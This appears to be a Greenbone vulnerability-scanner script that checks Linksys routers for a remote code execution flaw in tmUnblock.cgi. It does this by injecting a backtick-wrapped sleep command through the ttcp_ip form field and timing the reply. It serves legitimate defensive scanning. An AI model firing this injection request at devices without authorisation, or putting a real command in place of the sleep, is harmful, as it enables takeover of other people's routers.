# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103909");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-02-18 12:42:30 +0100 (Tue, 18 Feb 2014)");

  script_name("Multiple Linksys Devices Multiple RCE Vulnerabilities");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_hnap_detect.nasl", "gb_linksys_devices_consolidation.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("linksys/detected", "HNAP/vendor", "HNAP/port");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65585");

  script_tag(name:"impact", value:"An attacker can exploit these issues to execute arbitrary code in the
  context of the affected device. Successful exploitation can completely compromise the vulnerable device.");

  script_tag(name:"vuldetect", value:"Try to execute a command on the remote host");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_tag(name:"summary", value:"Multiple Linksys devices are prone to multiple remote code
  execution (RCE) vulnerabilities.");

  script_tag(name:"affected", value:"Linksys E4200, E3200, E3000, E2500, E2100L, E2000, E1550, E1500, E1200,
  E1000, E900, E300, WAG320N, WAP300N, WAP610N, WES610N, WET610N, WRT610N, WRT600N, WRT400N, WRT320N, WRT160N,
  WRT150N.

  This list may not be accurate and/or complete!");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");

port = get_kb_item( "HNAP/port" );
if( ! port ) exit( 0 );

vendor = get_kb_item( "HNAP/" + port + "/vendor" );
if( "linksys" >!< tolower( vendor ) || "cisco" >!< tolower( vendor ) ) exit(0 );

sleep = make_list( 3, 5, 8 );

host = http_host_name( port:port );
vt_strings = get_vt_strings();
userpass64 = base64( str:'admin:' + vt_strings["default"] );

foreach i( sleep ) {
  ex = 'submit_button=&change_action=&submit_type=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h `sleep%20' + i + '`&StartEPI=1';
  len = strlen( ex );

  req = 'POST /tmUnblock.cgi HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'Authorization: Basic ' + userpass64 + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        ex;

  start = unixtime();
  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
  stop = unixtime();

  if( "200 ok" >!< tolower( buf ) ) exit( 0 );

  if( stop - start < i || stop - start > ( i+5 ) ) exit( 99 );
}

security_message( port:port );
exit( 0 );
